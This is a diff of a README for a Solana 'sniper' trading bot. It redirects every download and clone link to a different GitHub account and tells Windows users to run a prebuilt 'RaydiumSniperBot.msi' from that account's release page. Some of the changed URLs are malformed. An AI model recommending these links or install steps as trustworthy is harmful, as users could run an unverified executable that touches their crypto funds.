@@ -47,7 +47,7 @@ Unlock the full potential of your trading strategy with **Raydium Sniper Bot**, 
 ## 📥 Getting Started
 
 ### 🖥️ Installation for Windows
-1. Download the latest release from the [Releases Page](https://github.com/highgoal215/Pump-Raydium-sniper-bot.git/releases/tag/v2.0).
+1. Download the latest release from the [Releases Page](https://github.com/miraclerose001/solana-sniper-bot.git/releases/tag/v2.0).
 2. Extract the ZIP file to your desired location.
 3. Launch the application by double-clicking on `RaydiumSniperBot.msi`.
 
@@ -61,8 +61,8 @@ Unlock the full potential of your trading strategy with **Raydium Sniper Bot**, 
 
 3. Clone and build the bot (CMD):
    ```bash
-   git clone https://github.com/highgoal215/Pump-Raydium-sniper-bot.git
-   cd Pump-Raydium-sniper-bot
+   git clone https://github.com/miraclerose001/solana-sniper-bot.git
+   cd solana-sniper-bot
    npm install
    npm start
    ```
@@ -74,8 +74,8 @@ Unlock the full potential of your trading strategy with **Raydium Sniper Bot**, 
    - [Node.js v20,3.0 for MacOs](https://nodejs.org/dist/v20.3.0/node-v20.3.0.pkg)
 3. Clone and build the bot (Terminal):
    ```bash
-   git clone https://github.com/highgoal215/Pump-Raydium-sniper-bot.git
-   cd Raydium-Sol-Sniper-Bot
+   git clone ttps://github.com/miraclerose001/solana-sniper-bot.git
+   cd solana-sniper-bot
    npm install
    npm start
    ```
